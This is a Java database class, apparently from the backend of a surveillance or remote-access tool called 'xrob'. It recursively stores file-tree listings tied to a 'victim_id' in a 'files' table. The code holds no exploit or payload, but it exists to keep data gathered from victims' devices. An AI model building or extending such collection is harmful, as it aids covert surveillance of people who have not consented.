package com.theah64.xrob.api.database.tables;

import com.sun.istack.internal.Nullable;
import com.theah64.xrob.api.database.Connection;
import com.theah64.xrob.api.models.File;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.sql.PreparedStatement;
import java.sql.SQLException;

/**
 * Created by theapache64 on 16/9/16,9:25 PM.
 */
public class Files extends BaseTable<File> {

    private Files() {
    }

    private static final Files instance = new Files();

    public static Files getInstance() {
        return instance;
    }

    @Override
    public void addv2(@Nullable String victimId, JSONArray jaFiles) throws RuntimeException, JSONException {
        final String query = "INSERT INTO files (victim_id,file_name,parent_id,is_directory,file_size_in_kb) VALUES (?,?,?,?,?);";
        final java.sql.Connection con = Connection.getConnection();
        try {
            final PreparedStatement ps = con.prepareStatement(query);
            ps.setString(1, victimId);
            insert(ps, "0", jaFiles);
            ps.close();
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
    }

    private void insert(PreparedStatement ps, final String parentId, JSONArray jaFiles) throws JSONException, SQLException {
        for (int i = 0; i < jaFiles.length(); i++) {
            final JSONObject joFile = jaFiles.getJSONObject(i);
            final String id = joFile.getString("id");
            final String name = joFile.getString("name");
            final long size = joFile.getLong("size");
            final boolean isDirectory = joFile.has("files");

            ps.setString(2, name);
            ps.setString(3, parentId);
            ps.setBoolean(4, isDirectory);
            ps.setLong(5, size);

            if (ps.executeUpdate() != 1) {
                throw new SQLException("Failed to add file");
            }

            if (isDirectory) {
                final JSONArray jaFiles2 = joFile.getJSONArray("files");
                if (jaFiles.length() > 0) {
                    insert(ps, id, jaFiles2);
                }
            }

        }
    }
}
